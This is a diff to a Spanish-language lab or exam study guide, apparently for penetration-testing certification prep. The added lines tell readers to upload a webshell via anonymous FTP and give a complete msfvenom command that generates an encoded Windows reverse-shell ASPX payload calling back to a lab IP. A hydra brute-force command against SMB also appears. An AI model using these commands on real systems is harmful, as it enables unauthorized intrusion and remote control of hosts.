@@ -97,7 +97,8 @@ hydra -L usuarios.txt -P /usr/share/wordlists/rockyou.txt smb://<IP_del_objetivo
 ## **Explotación de FTP**
 
 1. **Subida de Webshell**:
-   - accedan al servidor FTP donde subí una **webshell** (`shell.aspx`), debemos tener encuenta que existe un webshell, pero con anonymous pueden subir el archivo asi que mejor una revershell...
+   - accedan al servidor FTP donde subí una **webshell** (`shell.aspx`), debemos tener encuenta que existe un webshell, pero con anonymous pueden subir el archivo asi que mejor una revershell... lo consultan en la web http://192.168.100.51/shell.aspx no olvides escuchar con netcat....
+   - si no te deja copiar o algun error X: usa msfvenom.... msfvenom -f aspx -p windows/shell_reverse_tcp LHOST=192.168.100.5 LPORT=4443 -e x86/shikata_ga_nai -o shell.aspx; y escuchas por el multi/handler
 
 2. **Ejecución de la Webshell**:
    - configuren un listener (`nc`) para recibir la conexión y ejecuté la shell accediendo a su ruta desde el navegador "nc -lnvp (#)".
@@ -113,7 +114,7 @@ hydra -L usuarios.txt -P /usr/share/wordlists/rockyou.txt smb://<IP_del_objetivo
 2. **Uso de Hydra**: Es una herramienta poderosa para fuerza bruta en servicios como XRDP, SMB y FTP.
 3. **Documentar todo**: Anoten usuarios, contraseñas y comandos utilizados para facilitar la resolución de preguntas del examen y hagan sus diccionarios propios.
 4. **Prueben manualmente**: Aunque Metasploit es útil, es importante entender los procesos manuales detrás de los exploits.
-5. **existe una pregunta de usuarios como contraseña de alguno y si existen**: si es por xrdp, revisen remote desktop y enumeren manualmente... primero validar que existan con net user. 
+5. **Existe una pregunta de usuarios como contraseña de alguno y si existen**: si es por xrdp, revisen remote desktop y enumeren manualmente... primero validar que existan con net user. 
 ---
 
 SUERTE! 
